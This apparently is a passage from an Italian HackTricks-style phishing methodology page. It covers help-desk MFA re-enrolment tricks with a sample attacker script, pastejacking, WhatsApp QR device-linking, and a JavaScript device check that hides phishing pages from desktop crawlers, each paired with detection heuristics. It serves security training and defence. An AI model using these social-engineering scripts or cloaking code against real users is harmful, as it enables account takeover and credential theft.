Oltre al classico push bombing, gli operatori semplicemente **forzano una nuova registrazione MFA** durante la chiamata all’help desk, invalidando il token esistente dell’utente. Qualsiasi successiva richiesta di accesso sembra legittima alla vittima.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

Monitora gli eventi di AzureAD/AWS/Okta in cui **`deleteMFA` + `addMFA`** si verificano **a pochi minuti di distanza dallo stesso IP**.



## Clipboard Hijacking / Pastejacking

Gli aggressori possono copiare silenziosamente comandi malevoli negli appunti della vittima da una pagina web compromessa o typosquattata, per poi indurre l’utente a incollarli in **Win + R**, **Win + X** o in una finestra del terminale, eseguendo codice arbitrario senza download né allegati.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Phishing mobile e distribuzione di app malevole (Android e iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Hijacking del collegamento di un dispositivo WhatsApp tramite social engineering con QR
* Una pagina-esca (ad es., un falso “canale” di un ministero/CERT) mostra un QR di WhatsApp Web/Desktop e invita la vittima a scansionarlo, aggiungendo silenziosamente l’aggressore come **dispositivo collegato**.<sup>[[12]](#references)</sup>
* L’aggressore ottiene immediatamente visibilità su chat e contatti finché la sessione non viene rimossa. In seguito le vittime potrebbero visualizzare una notifica di “nuovo dispositivo collegato”; i difensori possono cercare eventi di collegamento di dispositivi imprevisti poco dopo le visite a pagine QR non attendibili.

### Phishing con accesso limitato ai dispositivi mobili per eludere crawler/sandbox
Gli operatori limitano sempre più spesso i loro flussi di phishing con un semplice controllo del dispositivo, così che i crawler desktop non raggiungano mai le pagine finali. Uno schema comune prevede un piccolo script che verifica la presenza di un DOM compatibile con il touch e invia il risultato a un endpoint del server; i client non mobili ricevono HTTP 500 (o una pagina vuota), mentre agli utenti mobili viene mostrato il flusso completo.<sup>[[7]](#references)</sup>

Frammento client minimale (logica tipica):

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js` logica (semplificata):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Comportamento del server osservato frequentemente:
- Imposta un cookie di sessione durante il primo caricamento.
- Accetta `POST /detect {"is_mobile":true|false}`.
- Restituisce 500 (o un placeholder) alle successive richieste GET quando `is_mobile=false`; serve la pagina di phishing solo se `true`.

Euristiche per la ricerca e il rilevamento:
- Query urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetria web: sequenza `GET /static/detect_device.js` → `POST /detect` → HTTP 500 per i dispositivi non mobili; i percorsi delle vittime legittime su dispositivi mobili restituiscono 200 e HTML/JS successivo.
- Bloccare o esaminare attentamente le pagine che mostrano contenuti esclusivamente in base a `ontouchstart` o a controlli simili del dispositivo.

Suggerimenti per la difesa:
- Eseguire i crawler con fingerprint simili a quelli dei dispositivi mobili e JS abilitato per rivelare i contenuti nascosti.
- Generare un avviso per le risposte 500 sospette successive a `POST /detect` su domini registrati di recente.

## References

- [1] [Generazione di varianti di dominio usate nel phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Individuare il phishing: strumenti e tecniche (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Rubare credenziali e bypassare la 2FA usando noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Robando sesiones y bypasseando 2FA con EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Come installare e configurare DKIM con Postfix su Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Report globale Unit 42 sulla risposta agli incidenti 2025 – Edizione social engineering](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – infrastruttura di phishing accessibile solo da dispositivi mobili ed euristiche (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [La nuova frontiera degli attacchi di assemblaggio runtime: uso degli LLM per generare JavaScript di phishing in tempo reale](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonificazione, click hijacking e TDS: all'interno di un ecosistema di distribuzione di malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting di Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Dirottamento del traffico verso windows.com di Microsoft tramite bit flipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Amore? In realtà: falsa app di incontri usata come esca in una campagna di spyware mirata in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoC e campioni di ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
